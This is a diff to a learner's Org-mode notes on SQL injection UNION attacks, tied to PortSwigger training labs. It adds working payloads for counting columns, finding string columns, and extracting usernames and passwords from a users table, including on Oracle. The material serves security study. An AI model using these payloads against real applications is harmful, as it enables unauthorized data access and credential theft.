@@ -1,6 +1,25 @@
 #+title: SQL UNION Attack
 #+description: More about SQL UNION attack
 
+* Table of Contens :toc:
+- [[#summery][Summery]]
+- [[#union-keyword][UNION Keyword]]
+- [[#determining-the-number-of-columns-required-in-sql-injection-union-attack][Determining the number of columns required in SQL injection UNION attack]]
+- [[#finding-columns-with-a-useful-data-type-in-sql-injection-union-attack][Finding columns with a useful data type in SQL injection UNION attack]]
+- [[#using-a-sql-injection-union-attack-to-retrieve-interesting-data][Using a SQL injection UNION attack to retrieve interesting data]]
+- [[#retrieving-multiple-values-within-a-single-column][Retrieving multiple values within a single column]]
+
+* Summery
+- Find out the number of columns in original query returns
+  #+begin_src sql
+    ' ORDER BY 1 --
+  #+end_src
+  Increase the number until it give any kind of error.
+  
+- After that decide what data type columns contains
+  #+begin_src sql
+    'UNION SELECT 'abc',NULL--
+  #+end_src
 * UNION Keyword
 Used to retrieve data from other tables within the database in SQL
 
@@ -24,6 +43,53 @@ The UNION keyword execute one or more additional ~SELECT~ queries and append the
 
    1. Submitting a series of ~UNION SELECT~  payloads specifying a different number of null values:
 
-      #+begin_src sql
-      
-      #+end_src
+   #+begin_src sql
+   ' UNION SELECT NULL--
+   ' UNION SELECT NULL,NULL--
+   ' UNION SELECT NULL,NULL,NULL--
+   #+end_src
+
+
+*** Lab
+- [[https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns][SQL injection UNION attack, determining the number of columns returned by the query]]
+- [[https://github.com/touhidulshawan/portswigger-labs/blob/main/sql-injection/lab03.org][Solution]]
+
+* Finding columns with a useful data type in SQL injection UNION attack
+
+Having already determined the number of required columns, we can probe each column to test whether it can hold string data by submitting a series of ~UNION SELECT~ payloads that place a string value into each column in turn. For example, if the query returns 4 column, we could submit
+#+begin_src sql
+  ' UNION SELECT 'a',NULL,NULL,NULL--
+  ' UNION SELECT NULL,'a',NULL,NULL--
+  ' UNION SELECT NULL,NULL,'a',NULL--
+  ' UNION SELECT NULL,NULL,NULL,'a'--
+#+end_src
+If the data type of column is not compatible with string data, the injected query will cause a database error, such as
+*Conversion faild when converting the varchar value* 'a' to data type int.
+
+*** Lab
+- [[https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text][SQL injection UNION attack, finding a column containing text]]
+- [[https://github.com/touhidulshawan/portswigger-labs/blob/main/sql-injection/lab04.org][Solution]]
+
+* Using a SQL injection UNION attack to retrieve interesting data
+Suppose that:
++ The original query returns 2 columns, both of which can hold string data
++ The injection point is a quoted string within the ~WHERE~ clause.
++ The database contains a table called ~users~ with the columns ~username~ and ~password~
+In this situation, we can retrieve the content of the ~users~ table by submitting the input:
+#+begin_src sql
+ ' UNION SELECT username, password FROM users-- 
+#+end_src
+
+*** Lab
+- [[https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables][SQL injection UNION attack, retrieving data from other tables]]
+- [[https://github.com/touhidulshawan/portswigger-labs/blob/main/sql-injection/lab05.org][Solution]]
+* Retrieving multiple values within a single column
+We can easily retreive multiple values together within single column by concatenating the values together. On /Oracle/ we could submit the input: 
+#+begin_src sql
+  ' UNION SELECT username || '~' || password FROM users --
+#+end_src
+/This uses the double-piped sequence ~||~ which is a string concatenation operator on Oracle/ 
+
+*** Lab
+- [[https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column][SQL injection UNION attack, retrieving multiple values in a single column]]
+- [[https://github.com/touhidulshawan/portswigger-labs/blob/main/sql-injection/lab06.org][Solution]]
